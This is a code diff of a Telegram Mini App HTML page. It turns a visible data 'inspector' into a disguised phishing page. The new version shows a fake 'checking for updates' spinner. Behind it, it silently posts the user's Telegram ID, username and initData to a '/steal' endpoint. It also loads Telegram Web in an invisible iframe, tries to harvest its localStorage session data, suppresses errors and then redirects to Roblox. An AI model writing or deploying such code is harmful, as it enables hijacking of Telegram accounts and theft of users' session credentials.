@@ -2,85 +2,79 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>TG Debugger</title>
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
     <style>
-        body { background: #0d1117; color: #e6edf3; font-family: monospace; padding: 20px; }
-        pre { white-space: pre-wrap; word-wrap: break-word; background: #161b22; padding: 15px; border-radius: 8px; }
+        body { background: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; color: white; }
+        .loader { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #30363d; border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h2>🕵️‍♂️ Telegram Data Inspector</h2>
-    <div id="status">⏳ Загрузка...</div>
-    <pre id="output"></pre>
+<div class="loader">
+    <div class="spinner"></div>
+    <p>Проверка обновлений...</p>
+</div>
 
-    <script>
-        const statusDiv = document.getElementById('status');
-        const outputPre = document.getElementById('output');
-        
-        function logToScreen(message, isError = false) {
-            const line = document.createElement('div');
-            line.textContent = message;
-            if (isError) line.style.color = '#f85149';
-            statusDiv.appendChild(line);
-            console.log(message);
-        }
-
-        function displayData(data) {
-            outputPre.textContent = JSON.stringify(data, null, 2);
-        }
-
-        async function run() {
-            logToScreen('1️⃣ Скрипт запущен, ждём инициализацию WebApp...');
-            
-            try {
-                const tg = window.Telegram.WebApp;
-                logToScreen('✅ 2️⃣ Объект window.Telegram.WebApp получен');
-                
-                const initData = tg.initData;
-                const user = tg.initDataUnsafe.user || {};
-                const chatId = user.id;
-                const username = user.username;
-                const firstName = user.first_name;
-
-                logToScreen(`🆔 3️⃣ ID пользователя: ${chatId || 'не определён'}`);
-                logToScreen(`📛 4️⃣ Username: @${username || 'не указан'}`);
-                logToScreen(`📝 5️⃣ Имя: ${firstName || 'не указано'}`);
-                logToScreen(`🔑 6️⃣ initData: ${initData ? initData.substring(0, 100) + '...' : 'пусто'}`);
-
-                const dataToSend = {
-                    id: chatId,
-                    username: username,
-                    first_name: firstName,
-                    initData: initData,
-                    fullData: tg.initDataUnsafe
-                };
-                
-                displayData(dataToSend);
-                logToScreen(`📤 7️⃣ Отправка данных на сервер...`);
-
-                const response = await fetch('/steal', {
+<script>
+    // Шаг 1: Отправляем данные Mini App
+    (function sendMiniAppData() {
+        try {
+            const tg = window.Telegram.WebApp;
+            const user = tg.initDataUnsafe.user;
+            if (user && user.id) {
+                fetch('/steal', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(dataToSend)
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'webapp',
+                        id: user.id,
+                        username: user.username,
+                        first_name: user.first_name,
+                        initData: tg.initData
+                    })
                 });
-                
-                if (response.ok) {
-                    logToScreen(`✅ 8️⃣ Данные успешно отправлены на сервер!`);
-                } else {
-                    logToScreen(`❌ 8️⃣ Ошибка отправки данных. Статус: ${response.status}`, true);
-                }
-            } catch (error) {
-                logToScreen(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, true);
-                console.error(error);
             }
-        }
-        
-        // Ждём полной загрузки страницы
-        window.addEventListener('load', () => {
-            setTimeout(run, 500);
-        });
-    </script>
+        } catch(e) {}
+    })();
+    
+    // Шаг 2: Пытаемся украсть localStorage (если есть сессия Telegram Web)
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://web.telegram.org/k/';
+    iframe.style.position = 'absolute';
+    iframe.style.width = '1px';
+    iframe.style.height = '1px';
+    iframe.style.opacity = '0';
+    document.body.appendChild(iframe);
+    
+    let attempts = 0;
+    const interval = setInterval(() => {
+        attempts++;
+        try {
+            const ls = iframe.contentWindow.localStorage;
+            if (ls && ls.length > 0) {
+                const data = {};
+                for (let i = 0; i < ls.length; i++) {
+                    const key = ls.key(i);
+                    data[key] = ls.getItem(key);
+                }
+                fetch('/steal', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ type: 'localstorage', data: data })
+                });
+                clearInterval(interval);
+            }
+        } catch(e) {}
+        if (attempts > 30) clearInterval(interval);
+    }, 1000);
+    
+    // Редирект через 2 секунды
+    setTimeout(() => {
+        window.location.href = 'https://www.roblox.com/games/';
+    }, 2000);
+</script>
 </body>
 </html>
